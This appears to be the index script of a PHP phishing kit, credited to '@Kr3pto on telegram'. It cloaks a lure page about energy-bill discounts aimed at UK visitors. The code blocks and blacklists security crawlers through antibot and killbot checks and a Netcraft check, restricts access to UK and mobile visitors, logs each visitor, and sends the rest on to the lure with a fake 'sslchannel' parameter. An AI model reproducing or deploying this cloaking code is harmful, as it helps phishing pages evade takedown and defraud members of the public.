<?php
// @Kr3pto on telegram
error_reporting(0);
session_start();
require "configg.php";
require "eng_assetz/vinc/functions.php";
require "eng_assetz/dev.php";
if($internal_antibot == 1){
	require "eng_assetz/old_blocker.php";
}
if($enable_killbot == 1){
	if(checkkillbot($killbot_key) == true){
		$fp = fopen("eng_assetz/vinc/blacklist.dat", "a");
		fputs($fp, "\r\n$ip\r\n");
		fclose($fp);
		header_remove();
		header("Connection: close\r\n");
		http_response_code(404);
		exit;
	}
}
if($mobile_lock == 1){
	require "eng_assetz/mob_lock.php";
}
if($UK_lock == 1){
	if(onlyuk() == true){
	
	}else{
		$fp = fopen("eng_assetz/vinc/blacklist.dat", "a");
		fputs($fp, "\r\n$ip\r\n");
		fclose($fp);
		header_remove();
		header("Connection: close\r\n");
		http_response_code(404);
		exit;
	}
}
if($external_antibot == 1){
	if(checkBot($apikey) == true){
		$fp = fopen("eng_assetz/vinc/blacklist.dat", "a");
		fputs($fp, "\r\n$ip\r\n");
		fclose($fp);
		header_remove();
		header("Connection: close\r\n");
		http_response_code(404);
		exit;
	}
}
$rand = generateRandomString(130);
require "eng_assetz/vinc/visitor_log.php";
require "eng_assetz/vinc/netcraft_check.php";
require "eng_assetz/vinc/blacklist_lookup.php";
require "eng_assetz/vinc/ip_range_check.php";
header("location:getting-discount-energy-bill?sslchannel=true&sessionid=$rand");
?>